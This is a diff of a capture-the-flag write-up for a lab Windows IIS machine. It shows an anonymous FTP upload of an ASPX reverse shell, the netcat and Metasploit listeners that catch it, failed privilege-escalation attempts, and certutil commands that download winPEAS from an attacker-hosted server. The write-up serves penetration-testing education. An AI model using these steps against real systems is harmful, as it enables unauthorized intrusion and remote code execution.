@@ -165,30 +165,22 @@ msf5 > use auxiliary/scanner/ftp/anonymous
 Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
 But what reverse shell? 
 
-Doing some research (Source: https://www.atlantic.net/what-is-an-iis-server/), we see:
+Doing some research ([Source](https://www.atlantic.net/what-is-an-iis-server/)), we see:
 ```
 Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations.
 ```
 Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 
 
-## Reverse Shell Upload
-We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell.
+## Reverse Shell Execution
+We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell. 
+Upload to FTP [source](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/).
 
-PHP reverse shell source: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+PHP reverse shell [source](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Couldn't run the PHP file at all.
 
-Upload to FTP source: https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
+We find a ASPX reverse shell online, [source](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and used it!
+We upload through `ftp> put shell.aspx`.
 
 ```
-hippoeug@kali:~$ nc -nvlp 4545
-listening on [any] 4545 ...
-connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49162
-Spawn Shell...
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-c:\windows\system32\inetsrv>
-```
-
 hippoeug@kali:~$ ftp 10.10.10.5 21
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -197,73 +189,67 @@ Name (10.10.10.5:hippoeug): anonymous
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
-ftp> ls
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-03-18-17  01:06AM       <DIR>          aspnet_client
-03-17-17  04:37PM                  689 iisstart.htm
-12-01-20  08:14PM                 5685 php-reverse-shell.php
-03-17-17  04:37PM               184946 welcome.png
-226 Transfer complete.
 ftp> put shell.aspx
 local: shell.aspx remote: shell.aspx
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 16393 bytes sent in 0.00 secs (31.0190 MB/s)
-ftp> ;s
-?Invalid command
-ftp> ls
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-03-18-17  01:06AM       <DIR>          aspnet_client
-03-17-17  04:37PM                  689 iisstart.htm
-12-01-20  08:14PM                 5685 php-reverse-shell.php
-12-01-20  08:18PM                16393 shell.aspx
-03-17-17  04:37PM               184946 welcome.png
-226 Transfer complete.
-  
-  
- http://10.10.10.5/shell.aspx
- 
- 
- msf5 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf5 exploit(multi/handler) > show options
+```
+Run it by navigating to `http://10.10.10.5/shell.aspx`.
 
-Module options (exploit/multi/handler):
+We also have netcat listening.
+```
+hippoeug@kali:~$ nc -nvlp 4545
+listening on [any] 4545 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.10.10.5] 49162
+Spawn Shell...
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
+c:\windows\system32\inetsrv>
+```
 
-
-Payload options (generic/shell_reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST                   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
-
-
-msf5 exploit(multi/handler) > set LHOST 10.10.14.10
-LHOST => 10.10.14.10
-msf5 exploit(multi/handler) > set LPOrT 4545
-LPOrT => 4545
+Alternatively, we can also use `exploit/multi/handler`.
+```
+msf5 > use exploit/multi/handler
+...
 msf5 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.10.14.10:4545 
-[*] Command shell session 1 opened (10.10.14.10:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800
+[*] Started reverse TCP handler on 10.10.x.x:4545 
+[*] Command shell session 1 opened (10.10.x.x:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800
+```
 
-
+## Privilege Escalation Failed Attempts
+Let's try somethings with metasploit.
+```
 msf5 > use post/multi/manage/shell_to_meterpreter
+...
+[*] Upgrading session ID: 1
+[-] Shells on the target platform, bsd, cannot be upgraded to Meterpreter at this time.
+[*] Post module execution completed
+```
+Nope.
 
+```
+msf5 > use exploit/windows/local/bypassuac
+...
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[-] Exploit aborted due to failure: none: Already in elevated state
+[*] Exploit completed, but no session was created.
+```
+Nope, didn't work. Probably because of `shell sparc/bsd`.
+```
+Active sessions
+===============
+  Id  Name  Type             Information                                                                       Connection
+  --  ----  ----             -----------                                                                       ----------
+  1         shell sparc/bsd  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49178 (10.10.10.5)
+```
+
+Enumerating with regular shell, we know it's Windows 7 in x86.
+```
 c:\windows\system32\inetsrv>systeminfo
 systeminfo
 
@@ -274,161 +260,30 @@ OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Standalone Workstation
 OS Build Type:             Multiprocessor Free
 Registered Owner:          babis
-Registered Organization:   
-Product ID:                55041-051-0948536-86302
-Original Install Date:     17/3/2017, 4:17:31 ��
-System Boot Time:          1/12/2020, 7:03:18 ��
-System Manufacturer:       VMware, Inc.
-System Model:              VMware Virtual Platform
+...
 System Type:               X86-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             el;Greek
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
-Total Physical Memory:     1.023 MB
-Available Physical Memory: 742 MB
-Virtual Memory: Max Size:  2.047 MB
-Virtual Memory: Available: 1.526 MB
-Virtual Memory: In Use:    521 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    HTB
-Logon Server:              N/A
-Hotfix(s):                 N/A
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: Intel(R) PRO/1000 MT Network Connection
-                                 Connection Name: Local Area Connection
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.5
+```
 
+Maybe we can use [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to enumerate the system.
 
-msf5 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 10.10.14.10:4545 
-[*] Command shell session 3 opened (10.10.14.10:4545 -> 10.10.10.5:49169) at 2020-11-28 19:34:55 +0800
-
-
-
-c:\windows\system32\inetsrv>cd ..
-cd ..
-
-c:\Windows\System32>cd ..
-cd ..
-
-c:\Windows>cd temp
-cd temp
-
-c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEASx86.exe" winpeas.exe
-certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEASx86.exe" winpeas.exe
+Let's also move to the temp folder where we have write permissions. We also host the winPEAS file using `python -m SimpleHTTPServer 8000`.
+We also used certutil.exe because there wasn't wget, curl etc.
+```
+c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEASx86.exe" winpeas.exe
+certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEASx86.exe" winpeas.exe
 ****  Online  ****
   000000  ...
   073400
 CertUtil: -URLCache command completed successfully.
-
-c:\Windows\Temp>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 8620-71F1
-
- Directory of c:\Windows\Temp
-
-01/12/2020  09:34 ��    <DIR>          .
-01/12/2020  09:34 ��    <DIR>          ..
-17/03/2017  01:10 ��                 0 DMI20C8.tmp
-28/12/2017  01:44 ��                 0 DMI4069.tmp
-01/12/2020  09:15 ��                 0 FXSAPIDebugLogFile.txt
-17/03/2017  05:42 ��             3.942 MpCmdRun.log
-17/03/2017  04:32 ��             5.194 MpSigStub.log
-18/03/2017  01:04 ��    <DIR>          rad11098.tmp
-18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
-18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
-18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
-18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
-18/03/2017  01:02 ��    <DIR>          rad87630.tmp
-18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
-18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
-18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
-18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
-18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
-17/03/2017  01:12 ��           180.224 TS_91C4.tmp
-17/03/2017  01:12 ��           196.608 TS_952F.tmp
-17/03/2017  01:12 ��           360.448 TS_95BC.tmp
-17/03/2017  01:12 ��           638.976 TS_96C6.tmp
-17/03/2017  01:12 ��            98.304 TS_989B.tmp
-17/03/2017  01:12 ��            98.304 TS_9909.tmp
-17/03/2017  01:12 ��           409.600 TS_99A6.tmp
-17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
-17/03/2017  01:12 ��           114.688 TS_A57B.tmp
-28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
-01/12/2020  08:47 ��            28.104 vmware-vmsvc.log
-28/12/2017  02:49 ��             6.807 vmware-vmusr.log
-01/12/2020  07:03 ��               376 vmware-vmvss.log
-01/12/2020  09:34 ��           472.064 winpeas.exe
-01/12/2020  09:15 ��    <DIR>          WPDNSE
-              18 File(s)      2.793.863 bytes
-              15 Dir(s)  24.608.706.560 bytes free
-
-c:\Windows\Temp>
-
-
-
-:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEAS.bat" winPEAS.bat
-certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEAS.bat" winPEAS.bat
+```
+Though we managed to get winPEAS.exe in, we couldn't run it. Let's try the winPEAS.bat instead.
+```
+c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEAS.bat" winPEAS.bat
+certutil.exe -urlcache -split -f "http://10.10.x.x:8000/winPEAS.bat" winPEAS.bat
 ****  Online  ****
   0000  ...
   8923
 CertUtil: -URLCache command completed successfully.
-
-c:\Windows\Temp>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 8620-71F1
-
- Directory of c:\Windows\Temp
-
-01/12/2020  09:50 ��    <DIR>          .
-01/12/2020  09:50 ��    <DIR>          ..
-17/03/2017  01:10 ��                 0 DMI20C8.tmp
-28/12/2017  01:44 ��                 0 DMI4069.tmp
-01/12/2020  09:15 ��                 0 FXSAPIDebugLogFile.txt
-17/03/2017  05:42 ��             3.942 MpCmdRun.log
-17/03/2017  04:32 ��             5.194 MpSigStub.log
-01/12/2020  09:40 ��                 0 output.txt
-18/03/2017  01:04 ��    <DIR>          rad11098.tmp
-18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
-18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
-18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
-18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
-18/03/2017  01:02 ��    <DIR>          rad87630.tmp
-18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
-18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
-18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
-18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
-18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
-17/03/2017  01:12 ��           180.224 TS_91C4.tmp
-17/03/2017  01:12 ��           196.608 TS_952F.tmp
-17/03/2017  01:12 ��           360.448 TS_95BC.tmp
-17/03/2017  01:12 ��           638.976 TS_96C6.tmp
-17/03/2017  01:12 ��            98.304 TS_989B.tmp
-17/03/2017  01:12 ��            98.304 TS_9909.tmp
-17/03/2017  01:12 ��           409.600 TS_99A6.tmp
-17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
-17/03/2017  01:12 ��           114.688 TS_A57B.tmp
-28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
-01/12/2020  09:18 ��            28.185 vmware-vmsvc.log
-28/12/2017  02:49 ��             6.807 vmware-vmusr.log
-01/12/2020  07:03 ��               376 vmware-vmvss.log
-01/12/2020  09:45 ��           472.064 winpeas
-01/12/2020  09:52 ��            35.107 winPEAS.bat
-01/12/2020  09:34 ��           472.064 winpeas.exe
-01/12/2020  09:15 ��    <DIR>          WPDNSE
-              21 File(s)      3.301.115 bytes
-              15 Dir(s)  24.603.930.624 bytes free
 
 c:\Windows\Temp>winPEAS.bat
 winPEAS.bat
@@ -497,123 +352,6 @@ C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
    [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                                                                       
    [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking                                                                           
 C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                                                                   
-                                                                                                                                                                      
-C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                                                                            
-                                                                                                                                                                      
-C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                                                                              
-                                                                                                                                                                      
-                                                                                                                                                                      
-[*] CREDENTIALS                                                                                                                                                       
-                                                                                                                                                                      
- [+] WINDOWS VAULT                                                                                                                                                    
-   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault                                                                           
-                                                                                                                                                                      
-Currently stored credentials:                                                                                                                                         
-                                                                                                                                                                      
-* NONE *                                                                                                                                                              
-                                                                                                                                                                      
-                                                                                                                                                                      
- [+] Unattended files                                                                                                                                                 
-                                                                                                                                                                      
- [+] SAM and SYSTEM backups                                                                                                                                           
-                                                                                                                                                                      
- [+] McAffee SiteList.xml                                                                                                                                             
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
-C:\Program Files                                                                                                                                                      
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
-                                                                                                                                                                      
-C:\Windows\Panther\setupinfo                                                                                                                                          
-C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
-C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
-C:\inetpub\temp\appPools\Web.config                                                                                                                                   
-                                                                                                                                                                      
----                                                                                                                                                                   
-Scan complete.                                                                                                                                                        
-                                                                                                                                                                      
- [+] GPP Password                                                                                                                                                     
-                                                                                                                                                                      
-                                                                                                                                                                      
-                                                                                                                                                                      
- [+] Cloud Credentials                                                                                                                                                
-                                                                                                                                                                      
- [+] AppCmd                                                                                                                                                           
-   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe                                                                              
-C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                                                                        
-                                                                                                                                                                      
- [+] Files in registry that may contain credentials                                                                                                                   
-   [i] Searching specific files that may contains credentials.                                                                                                        
-   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                
-Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                                                                     
-Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                   
-Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                             
-    DefaultUserName    REG_SZ    babis                                                                                                                                
-Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                            
-                                                                                                                                                                      
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                                                                                  
-                                                                                                                                                                      
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                                                                                  
-    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                                                                        
-    FTPSVC    REG_SZ    Software\Microsoft\FTPSVC\CurrentVersion                                                                                                      
-                                                                                                                                                                      
-Looking inside HKCU\Software\TightVNC\Server                                                                                                                          
-Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                               
-Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                       
-C:\Windows\Panther\setupinfo                                                                                                                                          
-C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
-C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
-C:\inetpub\temp\appPools\Web.config                                                                                                                                   
-                                                                                                                                                                      
----                                                                                                                                                                   
-Scan complete.                                                                                                                                                        
- [+] DPAPI MASTER KEYS                                                                                                                                                
-   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                                                                        
-   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                   
- [+] DPAPI MASTER KEYS                                                                                                                                                
-   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                                                                                   
-   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module                                                              
-   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                   
-                                                                                                                                                                      
-Looking inside C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Credentials\                                                                        
-                                                                                                                                                                      
-                                                                                                                                                                      
-Looking inside C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials\                                                                          
-                                                                                                                                                                      
-Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                   
-Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                             
-    DefaultUserName    REG_SZ    babis                                                                                                                                
-Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                            
-                                                                                                                                                                      
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                                                                                  
-                                                                                                                                                                      
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                                                                                  
-    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                                                                        
-    FTPSVC    REG_SZ    Software\Microsoft\FTPSVC\CurrentVersion                                                                                                      
-                                                                                                                                                                      
-Looking inside HKCU\Software\TightVNC\Server                                                                                                                          
-Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                               
-Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                       
-C:\Windows\Panther\setupinfo                                                                                                                                          
-C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
-C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
-C:\inetpub\temp\appPools\Web.config                                                                                                                                   
-                                                                                                                                                                      
----                                                                                                                                                                   
-Scan complete.                                                                                                                                                        
-                                                                                                                                                                      
- [+] Unattended files                                                                                                                                                 
-                                                                                                                                                                      
- [+] SAM and SYSTEM backups                                                                                                                                           
-                                                                                                                                                                      
- [+] McAffee SiteList.xml                                                                                                                                             
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
-C:\Program Files                                                                                                                                                      
- Volume in drive C has no label.                                                                                                                                      
- Volume Serial Number is 8620-71F1                                                                                                                                    
- Volume in drive C has no label.                                                                                                  
+...
+```
+We don't find anything interesting we can use, or know how to use unfortunately.
